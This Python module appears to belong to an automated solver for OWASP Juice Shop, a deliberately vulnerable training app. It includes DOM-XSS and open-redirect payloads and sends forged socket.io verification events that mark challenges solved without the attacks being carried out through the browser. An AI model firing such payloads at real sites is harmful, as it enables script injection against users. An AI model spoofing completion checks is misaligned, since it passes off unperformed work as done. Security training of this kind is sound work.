#!/usr/bin/env python3
"""
realtime.py - WebSocket (socket.io) driven challenges.

A handful of challenges are verified by the Angular client emitting a socket.io
event to the server (see lib/startup/registerWebsocketEvents.ts). We can emit
those events directly - no browser required - which is far more reliable than
driving the DOM:

  verifyCloseNotificationsChallenge  -> closeNotifications  (array length > 1)
  verifyLocalXssChallenge            -> localXss + xssBonus (payload string)
  verifySvgInjectionChallenge        -> svgInjection        (redirect string)
"""
from __future__ import annotations

import time

from core import register_solver, Client, ok, warn, fail

CAT = "XSS"
DOM_XSS = '<iframe src="javascript:alert(`xss`)">'
XSS_BONUS = ('<iframe width="100%" height="166" scrolling="no" frameborder="no" allow="autoplay" '
             'src="https://w.soundcloud.com/player/?url=https%3A//api.soundcloud.com/tracks/771984076'
             '&color=%23ff5500&auto_play=true&hide_related=false&show_comments=true&show_user=true'
             '&show_reposts=false&show_teaser=true"></iframe>')
SVG_PAYLOAD = ("../../../../redirect?to=https://cataas.com/cat?x="
               "https://github.com/juice-shop/juice-shop")


def _emit(base: str, events):
    """Open one socket.io connection and emit each (name, data) tuple."""
    try:
        import socketio
    except Exception:
        fail("python-socketio not installed - run: pip install 'python-socketio[client]'")
        return False
    sio = socketio.Client(reconnection=False, ssl_verify=False)
    try:
        sio.connect(base, wait_timeout=10)
        for name, data in events:
            sio.emit(name, data)
        time.sleep(1.0)
        sio.disconnect()
        return True
    except Exception as e:  # noqa
        fail(f"socket.io error: {type(e).__name__}: {e}")
        return False


@register_solver(["localXssChallenge", "xssBonusChallenge"], "DOM XSS + bonus (websocket)", CAT)
def local_xss(c: Client):
    if _emit(c.base, [("verifyLocalXssChallenge", DOM_XSS),
                      ("verifyLocalXssChallenge", XSS_BONUS)]):
        ok("emitted verifyLocalXssChallenge for DOM-XSS and bonus payloads")


@register_solver("svgInjectionChallenge", "SVG injection (websocket)", "Security Misconfiguration")
def svg_injection(c: Client):
    if _emit(c.base, [("verifySvgInjectionChallenge", SVG_PAYLOAD)]):
        ok("emitted verifySvgInjectionChallenge with cataas redirect payload")


@register_solver("closeNotificationsChallenge", "Close many notifications (websocket)", "Miscellaneous")
def close_notifications(c: Client):
    if _emit(c.base, [("verifyCloseNotificationsChallenge", [1, 2, 3])]):
        ok("emitted verifyCloseNotificationsChallenge with a multi-element array")
